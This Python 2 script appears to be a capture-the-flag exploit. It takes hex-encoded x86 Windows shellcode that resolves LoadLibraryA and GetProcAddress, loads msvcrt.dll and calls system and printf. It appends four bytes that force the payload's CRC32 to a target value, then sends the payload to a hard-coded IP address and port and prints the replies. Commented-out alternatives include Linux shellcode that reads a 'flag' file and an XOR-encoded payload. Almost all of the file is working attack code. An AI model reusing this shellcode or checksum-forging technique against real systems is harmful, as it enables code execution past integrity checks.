import socket
import time
from struct import*


def bit_not(n):
    binary = bin(n)
    binary = binary[2:]
    while len(binary) < 32:
        binary = "0" + binary

    not_binary = ""
    for _ in binary:
        if '1' == _:
            not_binary += '0'
        else:
            not_binary += '1'

    return int(not_binary, 2)
    # return (1 << n.bit_length()) - 1 - n

def reverse_bits(num, bit_size=32): 
  
    # convert number into binary representation 
    # output will be like bin(10) = '0b10101' 
    binary = bin(num) 
    # print(binary)

    # skip first two characters of binary 
    # representation string and reverse 
    # remaining string and then append zeros 
    # after it. binary[-1:1:-1]  --> start 
    # from last character and reverse it until 
    # second last character from left 
    reverse = binary[-1:1:-1] 
    reverse = reverse + (bit_size - len(reverse))*'0'

    # converts reversed binary string into integer 
    reversed_num = int(reverse,2) 

    # print(bin(reversed_num))
    return reversed_num

def calc_checksum(shellcode):
    hex_bytes = shellcode.decode("hex")

    checksum = 0xffffffff

    for b in hex_bytes:
        number = ord(b)
        reversed_number = reverse_bits(number)

        for j in range(8):
            if (reversed_number ^ checksum) & 0x80000000 == 0:
                checksum <<= 1
                checksum &= 0xFFFFFFFF
            else:        
                checksum <<= 1
                checksum &= 0xFFFFFFFF
                checksum ^= 0x04C11DB7

            reversed_number <<= 1
            reversed_number &= 0xFFFFFFFF

    checksum = bit_not(checksum)
    checksum = reverse_bits(checksum)

    return hex(checksum)


def fix_shellcode(shellcode, should="11000111100100111100100110010000"):
    hex_bytes = shellcode.decode("hex")

    checksum = 0xffffffff

    for b in hex_bytes:
        number = ord(b)
        reversed_number = reverse_bits(number)

        for j in range(8):
            if (reversed_number ^ checksum) & 0x80000000 == 0:
                checksum <<= 1
                checksum &= 0xFFFFFFFF
            else:        
                checksum <<= 1
                checksum &= 0xFFFFFFFF
                checksum ^= 0x04C11DB7

            reversed_number <<= 1
            reversed_number &= 0xFFFFFFFF

    c_1 = ""
    for i in range(8):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_1 += '0'
            else: c_1 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_1 += '1'
            else: c_1 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_1 = int(c_1, 2)
    c_1 = reverse_bits(c_1, 8)
    c_1 = chr(c_1)
    
    c_2 = ""
    for i in range(8,16):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_2 += '0'
            else: c_2 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_2 += '1'
            else: c_2 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_2 = int(c_2, 2)
    c_2 = reverse_bits(c_2, 8)
    c_2 = chr(c_2)

    c_3 = ""
    for i in range(16,24):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_3 += '0'
            else: c_3 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_3 += '1'
            else: c_3 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_3 = int(c_3, 2)
    c_3 = reverse_bits(c_3, 8)
    c_3 = chr(c_3)

    c_4 = ""
    for i in range(24,32):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_4 += '0'
            else: c_4 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_4 += '1'
            else: c_4 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_4 = int(c_4, 2)
    c_4 = reverse_bits(c_4, 8)
    c_4 = chr(c_4)


    hex_bytes += c_1 + c_2 + c_3 + c_4

    # checksum = bit_not(checksum)
    # checksum = reverse_bits(checksum)

    # target = 0xf00df00d
    # target = reverse_bits(target)
    # target = bit_not(target)
    # print(hex(target))



    return "".join(["{:02x}".format(ord(b)) for b in hex_bytes])


if __name__=='__main__':
    # shellcode = "31C9648B41308B400C8B7014AD96AD8B58108B533C01DA8B527801DA8B722001DE31C941AD01D881384765745075F4817804726F634175EB8178086464726575E28B722401DE668B0C4E498B721C01DE8B148E01DA31C95352516861727941684C696272684C6F61645453FFD2"
    shellcode = "31C9648B41308B400C8B7014AD96AD8B58108B533C01DA8B527801DA8B722001DE31C941AD01D881384765745075F4817804726F634175EB8178086464726575E28B722401DE668B0C4E498B721C01DE8B148E01DA31F689D631C9516861727941684C696272684C6F616489E15153FFD231C966B96C6C516872742E64686D73766389E151FFD031FF89C731D25266BA746652687072696E89E1515731D289F2FFD231C966B9660A5168656D696E687379737489E151FFD0"
    
    # shellcode = "31c031db31c931d2eb325bb00531c9cd8089c6eb06b00131dbcd8089f3b00383ec018d0c24b201cd8031db39c374e6b004b301b201cd8083c401ebdfe8c9ffffff666c6167"
    # shellcode = "31c050684141652258c1e808c1e80850b834470b4dbb5d696e3531d850b843321022bb796e514e31d850b860054232bb4978797131d850b80f1c2c14bb6a64493331d850b8073e0b40bb4652626e31d850b8440a7807bb6349425b31d850b80f164b0dbb6a31672d31d850b818625c1fbb614c396731d850b81b2d1e1fbb6b586a6b31d850b845404166bb3d78774931d850b8021f4b45bb6d6b386a31d850b8243e1932bb454e6a5a31d850b8005e3a35bb6c73495b31d850b81f374024bb6d52324131d850b82e356831bb5a4c454131d850b8481e1c15bb676e696131d850b826280d5dbb4f45623331d850b820571d45bb4778633631d850b8046a243bbb77444b4931d850b8180f0a32bb6c6e784731d850b87d183c27bb526c5d5531d850b803446060bb77345a4f31d850b8476b1f20bb6f4c775431d850b82a5e2b20bb6c37474531d850b85907120ebb3568736a31d850b80159112cbb4536664231d850b822224e5abb4c56677431d850b800371b48bb435b722d31d850b84a1f2213bb6448477131d850b86a230318bb4a6d666c31d850b82d54571cbb4731346831d850b84e15365abb3938793831d850b8597f1f04bb7957516131d850b847561d2fbb65703d5431d850b82c180854bb4d766c7431d850b85a34581bbb395b357631d850b83f0f4b41bb53636b6c31d850b84a1e590bbb386d316e31d850b8492b162abb3944614f31d85089e0bb41414101c1eb08c1eb08c1eb085350bb95e6b177ffd3bbcf2aae77ffd3"
    
    
    # for i in range(256):
    #     _ = bin(i)[2:]
    #     while len(_) < 8: _ = "0" + _
    #     should = "11000111100100111100100110010000"


        
    #     calculated_checksum = calc_checksum(fix_shellcode(shellcode))
    #     if "0xf00df00d" in calculated_checksum:
    #         print(_)
    #         # print(shellcode)
    #         # print(calc_checksum(shellcode))
    #         # print(fix_shellcode(shellcode, should))
    #         # print(calc_checksum(fix_shellcode(shellcode, should)))

    print(fix_shellcode(shellcode))
    print(calc_checksum(fix_shellcode(shellcode)))

    host = "18.196.92.84"
    port = 1337

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    time.sleep(1)    
    buffer = s.recv(1024)
    print(buffer)
    
    s.send(fix_shellcode(shellcode) + "\n")
    
    while True:
        time.sleep(1)
        buffer = s.recv(1024)
        print(buffer)

